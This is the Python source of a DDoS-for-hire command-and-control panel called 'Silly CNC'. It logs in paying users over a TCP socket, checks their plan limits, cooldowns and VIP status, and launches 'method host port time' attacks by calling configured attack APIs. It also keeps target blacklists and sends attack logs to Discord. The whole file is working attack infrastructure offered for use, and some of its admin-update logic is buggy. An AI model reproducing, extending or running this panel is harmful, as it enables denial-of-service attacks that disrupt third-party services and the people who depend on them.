import socket
import json
import time
import random
from sys import argv
from requests import get
from threading import Thread
from datetime import datetime, timedelta

DEBUG = False
DISCORD = False

if len(argv) == 1:
	print(f"Running normally, for debug mode do\npython3 {argv[0]} debug\r\n\r\n")
elif argv[1] in ("debug", "Debug"):
	DEBUG = True

# Load config and set the data as a CONSTANT
if DEBUG:
	print("[Silly Source] Loading CONFIG")
with open("config.json", "r") as f:
	try:
		CFG = json.load(f)
		if CFG["logging"]["discord"]["enabled"]:
			DISCORD = True
			from discord_webhook import DiscordWebhook, DiscordEmbed
	except Exception as e:
		exit(f"[{e}] Your config.json file is formatted inproperly or doesn't exist.")

if DEBUG:
	print("[Silly Source] Successfully Loaded CONFIG")
	if CFG["logging"]["enabled"]:
		LOGGING = True
		print("[Silly Source] Logging is enabled, you can disable it in config.json")
	else:
		LOGGING = False
		print("[Silly Source] Logging is disabled, you can enable it in config.json")

	print("[Silly Source] Loading LOGINS")

with open("logins.json", "r") as f:
	try:
		LOGINS = json.load(f)
	except Exception as e:
		exit(f"[{e}] Your logins.json file is formatted inproperly or doesn't exist")

if DEBUG:
	print("[Silly Source] Successfully Loaded LOGINS")
	print("[Silly Source] Loading METHODS")

with open("methods.json", "r") as f:
	try:
		METHODS = json.loads(f.read())
	except Exception as e:
		exit(f"[{e}] Your methods.json file is formatted inproperly or doesn't exist")

if DEBUG:
	print("[Silly Source] Successfully Loaded METHODS")
	print("[Silly Source] Loading BLACKLISTED")

with open("blacklisted.json", "r") as f:
	try:
		BLACKLISTED = json.load(f)
	except Exception as e:
		exit(f"[{e}] Your methods.json file is formatted inproperly or doesn't exist")

if DEBUG:
	print("[Silly Source] Successfully Loaded BLACKLISTED")
	print("[Silly Source] SuccessfullyLoaded All Databases")
	print("[Silly Source] Starting Server...")

ongoing = {
	"running_amount": 0,
	"info":[]
}

cooldown = {}

connected = {}


class Tools:
	global CFG
	global LOGINS
	global LOGGING
	global DISCORD
	global ongoing
	global cooldown
	def __init__(self) -> None:
		...

	@staticmethod
	def is_expired(username):
		expiry = LOGINS[username]["expiry"]
		expiration_date = datetime.strptime(expiry, '%Y-%m-%d')
		current_date = datetime.now()

		if current_date > expiration_date:
			return True, 0

		days_left = (expiration_date - current_date).days
		return False, days_left

	@staticmethod
	def title(sock, username):
		while True:
			sock.send(f'\033]0;S#### ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SI### ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SIL## ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SILL# ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SILLY ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SILLY S##### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SILLY SO#### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SILLY SOU### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SILLY SOUR## | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SILLY SOURC# | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)
			sock.send(f'\033]0;SILLY SOURCE | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SILLY SOURC# | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SILLY SOUR## | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SILLY SOU### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SILLY SO#### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SILLY S##### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SILLY ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SILL# ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SIL## ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;SI### ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;S#### ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.25)
			sock.send(f'\033]0;##### ###### | {username} | Expiry {Tools().is_expired(username)[1]} Days | {ongoing["running_amount"]}/{CFG["main"]["max_global_slots"]} Ongoing Attacks\007'.encode())
			time.sleep(0.5)





	@staticmethod
	def handle(sock, recv_addr) -> 	None:
		"""
		  Sock      - The client socket which is sending the connection
		  recv_addr - The ip address and port the client socket is sending from

		  This function simply just handles the connection, requires the user to login and checks
		  the login details. After, if the login succeeds then it will redirect the socket to the
		  logged_in function.
		"""
		sock.send(b'Username: ')
		user = sock.recv(1024).decode().replace("\r\n", "")
		sock.send(b'Password: ')
		passwrd = sock.recv(1024).decode().replace("\r\n", "")

		if user in LOGINS and passwrd == LOGINS[user]["password"]:
			if user not in connected.keys():
				if not Tools().is_expired(user)[0]:
					print(f"[{recv_addr[0]}:{user}] Successfully logged in")
					sock.send(b'Successfully Logged in.')
					sock.send(f'\033]0;Gang Shit | Expiry {Tools().is_expired(user)[1]} Days\007'.encode())
					connected[user] = sock
					Tools().logged_in(sock, recv_addr, user)
					sock.close()
				else:
					sock.send(b'Sorry, your account has expired.')
			else:
				sock.send(b'User already logged in, would you like to close your active session? [y/n] ')
				answer = sock.recv(1024).decode().replace("\r\n", "")
				if answer in ("y", "Y"):
					connected[user].close()
					sock.send(b'Successfully Logged in.')
					Tools().logged_in(sock, recv_addr, user)
					sock.close()
				else:
					sock.send(b'Okay, bye.')
					sock.close()


		else:
			print(f"[{recv_addr[0]}:{user}] Failed to login.")
			sock.close()

	@staticmethod
	def clear(sock) -> None:
		"""
		  Sock      - The client socket which is sending the connection
		  recv_addr - The ip address and port the client socket is sending from

		  Clears the users screen.
		"""
		sock.send("\r\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                              Welcome To Silly CNC\n\n\n".encode())

	@staticmethod
	def is_logged_in(user) -> bool:
		with open("logins.json", "r") as f:
			dta = json.load(f)
			if dta[user]["logged_in"]:
				return True
			else:
				return False

	@staticmethod
	def concurrents_handler(info: tuple) -> None:
		method = info[0]
		ip = info[1]
		port = info[2]
		atk_time = info[3]
		user = info[4]
		atk_id = ''.join(random.choice(["a", "b", "c", "d", "1", "2", "3"]) for i in range(5))
		length_remaining = int(atk_time)

		ongoing["running_amount"] += 1
		try:
			ongoing[user]["running"] += 1
		except KeyError:
			ongoing[user] = {"running":1}
		
		ongoing["info"].append(f"  {atk_id}    {user}      {method}      {ip}    {port}     {atk_time}     {length_remaining}")

		for _ in range(int(atk_time)):
			time.sleep(1)
			ongoing["info"] = [item.replace(f"  {atk_id}    {user}      {method}      {ip}    {port}     {atk_time}     {length_remaining}", f"  {atk_id}    {user}      {method}      {ip}    {port}     {atk_time}     {length_remaining - 1}")  for item in ongoing["info"]]
			length_remaining -= 1

		ongoing[user]["running"] -= 1
		ongoing["running_amount"] -= 1
		ongoing["info"] = [item for item in ongoing["info"] if not item.startswith(f"{atk_id} ")]


	@staticmethod
	def handle_cooldown(username):
		user_cooldown = int(LOGINS[username]["cooldown"])
		count = int(user_cooldown)
		cooldown[username] = int(user_cooldown)

		for _ in range(int(user_cooldown)):
			time.sleep(1)
			cooldown[username] = int(count)-1
			count -= 1

		del cooldown[username]

	@staticmethod
	def add_new(user, passwrd, timelimit, concurrents, cooldown, admin, expiry, vip):
		current_date = datetime.now()
		expiration_date = current_date + timedelta(days=int(expiry))

		new_user = {
			"password": passwrd,
			"admin": True if admin in ('y', 'Y') else False,
			"concurrents": concurrents,
			"timelimit": timelimit,
			"cooldown": cooldown,
			"vip": True if vip in ('y', 'Y') else False,
			"logged_in": False,
			"expiry": expiration_date.strftime('%Y-%m-%d')
		}

		LOGINS[user] = new_user

		with open("logins.json", "w") as file:
			json.dump(LOGINS, file, indent=4)


	@staticmethod
	def logged_in(sock, recv_addr, username):
		"""
		  Sock      - The client socket which is sending the connection
		  recv_addr - The ip address and port the client socket is sending from

		  Handles the users commands.
		"""
		try:
			Thread(target=Tools().title, args=(sock, username)).start()
			connected[username] = sock
			Tools().clear(sock) 
			while True:
				sock.send(f'\r[Silly@{username}] '.encode())
				cmd = sock.recv(1024).decode().replace("\r\n", "")

				try:
					method = METHODS[cmd.split(" ")[0]]
					parsed = cmd.split(" ")
					if len(parsed) != 4:
						sock.send(f'Syntax: {parsed[0]} host port time\r\nExample: {parsed[0]} 1.1.1.1 80 30\n'.encode())
					else:
						if parsed[1] in BLACKLISTED["stupid"]:
							if LOGGING:
								with open("logs/stupid.txt", "a") as f:
									f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
								if DEBUG:
									print(f"[Silly Source] Attack has been blocked from {username}, it has been logged in stupid.txt")
							sock.send(f'why are you trying to hit {parsed[1]} you fucking idiot\r\n'.encode())
						elif parsed[1] in BLACKLISTED["gov"]:
							if LOGGING:
								with open("logs/blacklisted.txt", "a") as f:
									f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
								if DEBUG:
									print(f"[Silly Source] Attack has been blocked from {username}, it has been logged in blacklisted.txt")
							sock.send(f'You cant hit govs/edus\r\n'.encode())
						elif parsed[1] in BLACKLISTED["dstat"]:
							if LOGGING:
								with open("logs/dstat.txt", "a") as f:
									f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
								if DEBUG:
									print(f"[Silly Source] Attack has been blocked from {username}, it has been logged in dstat.txt")
								if DISCORD:
									webhook = DiscordWebhook(url=CFG["logging"]["discord"]["dstat_logs"])
									embed = DiscordEmbed(title="[Silly Source] Attack Has Been blocked", description=f"**{username}** Attack blocked for dstat!\r\n\r\n\r\nMethod: **{parsed[0]}**\r\nHost: **{parsed[1]}**\r\nPort: **{parsed[2]}**\r\nTime: **{parsed[3]}**", color="f80303")
									webhook.add_embed(embed)
									response = webhook.execute()
							
							sock.send(f'You cant hit dstats\r\n'.encode())
						else:
							if CFG["main"]["max_global_slots"] == ongoing["running_amount"]:
								sock.send(f'Sorry, max slots of {CFG["main"]["max_global_slots"]} are full.\r\n'.encode())

							else:
								try:
									if int(LOGINS[username]["timelimit"]) < int(parsed[3]):
										sock.send(f'Your timelimit is {LOGINS[username]["timelimit"]}\r\n'.encode()) 
									
									elif int(LOGINS[username]["concurrents"]) == int(ongoing[username]["running"]):
										sock.send(f'Sorry, you have reached your max concurrents ({LOGINS[username]["concurrents"]})\r\n'.encode())

									else:
										try:
											if cooldown[username] != -1:
												sock.send(f'You are on cooldown for {cooldown[username]} more seconds\r\n'.encode())
										except:
											if METHODS[parsed[0]]["vip_only"] and not LOGINS[username]["vip"]:
												sock.send(b'You need to be VIP to use this method\r\n')
											else:
												if LOGGING:
													with open("logs/attacks.txt", "a") as f:
														f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
													if DEBUG:
														print(f"[Silly Source] Attack has been launched by {username}, it has been logged in attacks.txt")
													if DISCORD:
														try:
															webhook = DiscordWebhook(url=CFG["logging"]["discord"]["attack_logs"])
															embed = DiscordEmbed(title="[Silly Source] Attack Has Been Started", description=f"**{username}** Sent An Attack!\r\n\r\n\r\nMethod: **{parsed[0]}**\r\nHost: **{parsed[1]}**\r\nPort: **{parsed[2]}**\r\nTime: **{parsed[3]}**", color="44f803")
															webhook.add_embed(embed)
															response = webhook.execute()
														except Exception as e:
															print(f"ERROR: {e}")
												Thread(target=Tools().concurrents_handler, args=((parsed[0], parsed[1], parsed[2], parsed[3], username),)).start()
												Thread(target=Tools().handle_cooldown, args=((username),)).start()
												apis = METHODS[parsed[0]]["funnels"]
												formatted_api = []
												for api in apis:
													formatted_api.append(api.replace("(HOST)", parsed[1]).replace("(PORT)", parsed[2]).replace("(TIME)", parsed[3]))

												for api in formatted_api:
													try:
														resp = get(api)
														domain = api.split("https://")[1].split("/")[0]
													except Exception as e:
														if DEBUG:
															print(f"[Silly Source] {domain} RETURNED ERROR {e}")
													else:
														if DEBUG:
															print(f"[Silly Source] {domain} Returned status code {resp.status_code}")
															print(f"[Silly Source] {domain} Returned JSON {resp.json}")
												sock.send(b'Attack sent.\r\n')
								except Exception as e:
									print(e)
									try:
										if cooldown[username] != -1:
											sock.send(f'You are on cooldown for {cooldown[username]} more seconds\r\n'.encode())
									except:
										if METHODS[parsed[0]]["vip_only"] and not LOGINS[username]["vip"]:
											sock.send(b'You need to be VIP to use this method\r\n')
										else:
											if LOGGING:
												with open("logs/attacks.txt", "a") as f:
													f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
												if DEBUG:
													print(f"[Silly Source] Attack has been launched by {username}, it has been logged in attacks.txt")
											apis = METHODS[parsed[0]]["funnels"]
											formatted_api = []
											for api in apis:
												formatted_api.append(api.replace("(HOST)", parsed[1]).replace("(PORT)", parsed[2]).replace("(TIME)", parsed[3]))

											for api in formatted_api:
												try:
													resp = get(api)
													domain = api.split("https://")[1].split("/")[0]
												except Exception as e:
													if DEBUG:
														print(f"[Silly Source] {domain} RETURNED ERROR {e}")
												else:
													if DEBUG:
														print(f"[Silly Source] {domain} Returned status code {resp.status_code}")
														print(f"[Silly Source] {domain} Returned JSON {resp.json}")
													if DISCORD:
														try:
															webhook = DiscordWebhook(url=CFG["logging"]["discord"]["attack_logs"])
															embed = DiscordEmbed(title="[Silly Source] Attack Has Been Started", description=f"**{username}** Sent An Attack!\r\n\r\n\r\nMethod: **{parsed[0]}**\r\nHost: **{parsed[1]}**\r\nPort: **{parsed[2]}**\r\nTime: **{parsed[3]}**", color="44f803")
															webhook.add_embed(embed)
															response = webhook.execute()
														except Exception as e:
															print(f"ERROR: {e}")
											Thread(target=Tools().concurrents_handler, args=((parsed[0], parsed[1], parsed[2], parsed[3], username),)).start()
											Thread(target=Tools().handle_cooldown, args=((username),)).start()
											sock.send(b'Attack sent.\r\n')
				except:
					if cmd in ("clear", "cls"):
						Tools().clear(sock)
					elif cmd == "ongoing":
						if ongoing["running_amount"] == 0:
							sock.send("No attacks ongoing right now.\n".encode())
						else:
							formatted_list = '\r\n'.join(f"{x}" for x in ongoing["info"])
							sock.send(f"Showing {ongoing['running_amount']} Running attacks.\r\n\r\n|--ID--|--USER--|--METHOD--|--HOST--|--PORT--|--TIME--|--REMAINING--|\r\n{formatted_list}\r\n".encode())
					elif cmd == "add":
						if LOGINS[username]["admin"]:
							sock.send(f'Username: '.encode())
							user = sock.recv(1024).decode().replace("\r\n", "")
							sock.send(f'Password: '.encode())
							passwrd = sock.recv(1024).decode().replace("\r\n", "")
							sock.send(f'Concurrents: '.encode())
							concurrents = sock.recv(1024).decode().replace("\r\n", "")
							sock.send(f'Timelimit: '.encode())
							timelimit = sock.recv(1024).decode().replace("\r\n", "")
							sock.send(f'Cooldown: '.encode())
							cooldown = sock.recv(1024).decode().replace("\r\n", "")
							sock.send(f'VIP(y/n): '.encode())
							vip = sock.recv(1024).decode().replace("\r\n", "")
							sock.send(f'Admin(y/n): '.encode())
							admin = sock.recv(1024).decode().replace("\r\n", "")
							sock.send(b'Expiry(in days): ')
							expiry = sock.recv(1024).decode().replace("\r\n", "")

							Tools().add_new(user, passwrd, timelimit, concurrents, cooldown, admin, expiry, vip)
						else:
							sock.send(b'Yo bitch ass aint no admin')

					elif cmd in ("methods", "Methods"):
						payload = ""
						payload += "\r\n=====================  Methods  ======================\r\n"

						for method in METHODS:
							payload += f"{method}({'VIP' if METHODS[method]['vip_only'] else 'NORMAL'}) - {METHODS[method]['description']}\r\n"

						payload += "======================================================\r\n"

						Tools().clear(sock)

						sock.send(f'{payload}'.encode())

					elif cmd in ("help" "Help"):
						payload = "\r\n=====================  Help Page  ====================\r\n"
						payload += "help - takes you to the help page\r\nmyinfo - Shows your plan info\r\nmethods - shows the methods page\r\nclear - clear's the screen\r\nongoing - Shows all ongoing attacks\r\nupdate(ADMIN) - updates something specific about a user\r\nadd(ADMIN) - adds a new user\r\n"
						payload += "======================================================\r\n"
						Tools().clear(sock)

						sock.send(payload.encode())

					elif cmd in ("myinfo", "plan"):
						Tools().clear(sock)
						info = LOGINS[username]
						sock.send(f'\r\nUsername: {username}\r\nAdmin: {info["admin"]}\r\nConcurrents: {info["concurrents"]}\r\nTimelimit: {info["timelimit"]}\r\nCooldown: {info["cooldown"]}\r\nExpiry: {info["expiry"]}\r\nVIP: {info["vip"]}\r\n'.encode())

					elif cmd == "update":
						if LOGINS[username]["admin"]:
							sock.send(f'vip - set a users vip status to true/false\r\npassword - change a users password\r\nadmin - set a users admin status to true/false\r\nconcurrents - set a users concurrents\r\ntimelimit - set a users timelimit\r\ncooldown - set a users cooldown\r\nexpiry - set a users exipre date\r\n\r\nWhat would you like to update: '.encode())
							answ = sock.recv(1024).decode().replace("\r\n", "")
							sock.send(b'Username: ')
							change_usr = sock.recv(1024).decode().replace("\r\n", "")
							try:
								LOGINS[username]
							except:
								sock.send(b'This user doesnt exist\r\n')
							else:
								if answ in ("Password", "password", "pass", "Pass"):
									sock.send(b'Pick a new password: ')
									new_pswrd = sock.recv(1024).decode().replace("\r\n", "")
									LOGINS[change_usr]["password"] = new_pswrd

									with open('logins.json', 'w') as file:
										json.dump(LOGINS, file, indent=4)

									sock.send(b'Updated.\r\n')

								elif answ in ("vip", "Vip", "VIP"):
									sock.send(b'Should they be VIP(y/n): ')
									response = sock.recv(1024).decode().replace("\r\n", "")
									LOGINS[change_usr]["vip"] = True if response in ("y", "Y", "yes", "Yes") else False
									with open('logins.json', 'w') as file:
										json.dump(LOGINS, file, indent=4)
									sock.send(b'Updated.\r\n')
								
								elif answ in ("Admin", "admin"):
									sock.send(b'Should they be admin(y/n): ')
									response = sock.recv(1024).decode().replace("\r\n", "")
									LOGINS[change_usr]["admin"] = True if response in ("y", "Y", "yes", "Yes") else False
									with open('logins.json', 'w') as file:
										json.dump(LOGINS, file, indent=4)
									sock.send(b'Updated.\r\n')

								elif answ in ("Concurrents", "concurrents", "Concurrent", "concurrent"):
									sock.send(b'How many concurrents should they have: ')
									response = sock.recv(1024).decode().replace("\r\n", "")
									LOGINS[change_usr]["cooldown"] = int(response)
									with open('logins.json', 'w') as file:
										json.dump(LOGINS, file, indent=4)
									sock.send(b'Updated.\r\n')

								elif answ in ("timelimit", "Timelimit"):
									sock.send(b'New timelimit: ')
									response = sock.recv(1024).decode().replace("\r\n", "")
									LOGINS[change_usr]["cooldown"] = int(response)
									with open('logins.json', 'w') as file:
										json.dump(LOGINS, file, indent=4)
									sock.send(b'Updated.\r\n')

								elif answ in ("Cooldown", "cooldown"):
									sock.send(b'New Cooldown: ')
									response = sock.recv(1024).decode().replace("\r\n", "")
									LOGINS[change_usr]["cooldown"] = int(response)
									with open('logins.json', 'w') as file:
										json.dump(LOGINS, file, indent=4)
									sock.send(b'Updated.\r\n')

								elif answ in ("expiry", "Expiry"):
									try:
										sock.send(b'New expiry(in days): ')
										response = sock.recv(1024).decode().replace("\r\n", "")

										if not response.isdigit():
											raise ValueError("Please enter a valid number of days.")

										days_to_add = int(response)

										if days_to_add < 0:
											raise ValueError("Please enter a non-negative number of days.")

										current_date = datetime.now()
										expiration_date = current_date + timedelta(days=days_to_add)
										LOGINS[change_usr]["expiry"] = expiration_date.strftime('%Y-%m-%d')

										with open('logins.json', 'w') as file:
											json.dump(LOGINS, file, indent=4)

										sock.send(b'Updated.\r\n')

									except ValueError as ve:
										sock.send(f'Error: {str(ve)}\r\n'.encode())
									except Exception as e:
										sock.send(f'Error during update: {str(e)}\r\n'.encode())

								else:
									sock.send(b'Sorry, we dont recognise this option\r\n')



		except OSError:
			# This is when a session gets closed, it returns bad file descriptor.
			return -1




def main() -> None:
	try:
		s = socket.socket()
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind(('0.0.0.0', CFG["main"]["server_port"]))
		s.listen(999)
		if DEBUG:
			print(f"[Silly Source] Starting server on tcp port {CFG['main']['server_port']} (This can be modified in config.json)")
	except Exception as e:
		exit(f"[{e}] Error binding server, make sure the tcp port specified in your config isn't already running something and make sure server_port is in your config.")

	print("[Silly Source] Server Started.")
	if DEBUG:
		print("[Silly Source] Waiting for clients...")

	while True:
		sock, recv_addr = s.accept()
		print(f"Accepted connection from: {recv_addr}")
		Thread(target=Tools().handle, args=(sock, recv_addr)).start()
		sock.send(f'\033]0;Gang Shit\007'.encode())


if __name__ == "__main__":
	main()
